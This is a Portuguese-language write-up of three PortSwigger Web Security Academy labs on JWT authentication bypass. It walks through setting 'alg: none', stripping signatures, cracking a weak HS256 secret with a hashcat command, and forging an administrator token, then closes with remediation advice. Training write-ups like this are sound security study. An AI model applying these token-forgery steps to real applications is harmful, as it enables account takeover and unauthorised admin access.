# JWT Attacks – Authentication Bypass Labs

## 📌 Informações Gerais

* Plataforma: PortSwigger Web Security Academy
* Categoria: JWT Attacks
* Nível: Apprentice → Practitioner
* Ferramentas utilizadas:

  * Burp Suite
  * JWT Editor Extension
  * Hashcat
  * jwt.io

---

# Introdução

JSON Web Tokens (JWTs) são amplamente utilizados para gerenciamento de sessões e autenticação.

Um JWT normalmente possui três partes:

```text
HEADER.PAYLOAD.SIGNATURE
```

Exemplo:

```text
eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJ3aWVuZXIifQ.signature
```

A segurança do JWT depende principalmente da validação correta da assinatura.

Durante estes laboratórios foram exploradas três falhas clássicas:

1. Accepting tokens with no signature
2. Flawed signature verification
3. Weak signing key

Todas permitiram assumir a identidade do usuário administrador e acessar funcionalidades privilegiadas.

---

# LAB 1 – JWT Authentication Bypass via Unverified Signature

## 🎯 Objetivo

Explorar uma aplicação que aceita tokens JWT sem assinatura válida.

---

## Vulnerabilidade

O servidor aceitava JWTs utilizando:

```json
{
  "alg": "none"
}
```

Dessa forma, nenhuma assinatura era necessária.

---

## Enumeração

Após login com:

```text
wiener:peter
```

Foi identificado o JWT:

```json
{
  "sub": "wiener"
}
```

---

## Exploração

Alterar:

```json
{
  "sub": "wiener"
}
```

para:

```json
{
  "sub": "administrator"
}
```

Modificar o header:

```json
{
  "alg": "none"
}
```

Remover completamente a assinatura.

JWT final:

```text
HEADER.PAYLOAD.
```

---

## Resultado

Foi possível acessar:

```http
/admin
```

e excluir:

```http
/admin/delete?username=carlos
```

---

## Aprendizado

Nunca aceitar o algoritmo:

```json
{
  "alg": "none"
}
```

---

# LAB 2 – JWT Authentication Bypass via Flawed Signature Verification

## 🎯 Objetivo

Explorar uma implementação onde a assinatura JWT não era validada corretamente.

---

## Vulnerabilidade

O servidor verificava incorretamente a assinatura do token.

Isso permitia modificar claims críticos sem possuir a chave legítima.

---

## Enumeração

JWT identificado:

```json
{
  "iss": "portswigger",
  "sub": "wiener"
}
```

---

## Exploração

Alterar:

```json
{
  "sub": "wiener"
}
```

para:

```json
{
  "sub": "administrator"
}
```

Em seguida:

```json
{
  "alg": "none"
}
```

Remover a assinatura do token.

---

## Resultado

A aplicação aceitou o JWT adulterado.

Foi possível acessar:

```http
/admin
```

e excluir:

```http
/admin/delete?username=carlos
```

---

## Aprendizado

Mesmo quando JWTs possuem assinatura, uma implementação incorreta pode invalidar completamente a proteção.

---

# LAB 3 – JWT Authentication Bypass via Weak Signing Key

## 🎯 Objetivo

Descobrir a chave secreta utilizada pelo servidor para assinar JWTs e gerar um token administrativo válido.

---

## Vulnerabilidade

A aplicação utilizava:

```json
{
  "alg": "HS256"
}
```

Porém a chave secreta era extremamente fraca.

---

## Enumeração

JWT capturado após login:

```json
{
  "iss": "portswigger",
  "exp": "...",
  "sub": "wiener"
}
```

---

## Brute Force da Chave

Utilizando Hashcat:

```bash
hashcat -a 0 -m 16500 jwt.txt jwt.secrets.list
```

Resultado:

```text
secret1
```

---

## Criação do Token Malicioso

Payload original:

```json
{
  "sub": "wiener"
}
```

Payload modificado:

```json
{
  "sub": "administrator"
}
```

O token foi assinado novamente utilizando:

```text
secret1
```

---

## Resultado

A assinatura foi aceita pelo servidor.

Acesso obtido ao painel administrativo:

```http
/admin
```

Posteriormente foi executada:

```http
/admin/delete?username=carlos
```

Resolvendo o laboratório.

---

## Aprendizado

JWTs assinados com HS256 dependem completamente da força da chave secreta.

Segredos fracos podem ser quebrados rapidamente com wordlists públicas.

---

# Comparação dos Três Labs

| Lab                           | Falha                 | Impacto                      |
| ----------------------------- | --------------------- | ---------------------------- |
| Unverified Signature          | JWT sem assinatura    | Escalação para administrador |
| Flawed Signature Verification | Verificação incorreta | Escalação para administrador |
| Weak Signing Key              | Chave secreta fraca   | Forjamento completo de JWT   |

---

# Conceitos Aprendidos

## JWT Structure

```text
HEADER.PAYLOAD.SIGNATURE
```

## Claims importantes

```json
{
  "sub": "administrator",
  "iss": "portswigger",
  "exp": 123456789
}
```

## Algoritmos

### HS256

Assinatura baseada em segredo compartilhado.

### none

Nenhuma assinatura.

Deve ser bloqueado.

---

# Ferramentas Utilizadas

## Burp Suite

* Proxy
* Repeater
* Decoder

## JWT Editor

* Decodificação de JWT
* Modificação de claims
* Assinatura de tokens

## Hashcat

Modo JWT:

```bash
hashcat -m 16500
```

Utilizado para brute force de segredos HS256.

---

# Recomendações de Correção

* Nunca aceitar `alg: none`
* Validar todas as assinaturas JWT
* Utilizar segredos fortes e aleatórios
* Implementar rotação periódica de chaves
* Utilizar RS256 ou ES256 quando apropriado
* Validar privilégios no servidor e não apenas no JWT

---

# Conclusão

Os três laboratórios demonstram como falhas aparentemente pequenas na implementação de JWT podem resultar em comprometimento total da autenticação.

Em todos os cenários foi possível assumir a identidade do usuário administrator, acessar o painel administrativo e excluir o usuário carlos, demonstrando o impacto crítico de erros relacionados à validação de tokens JWT.
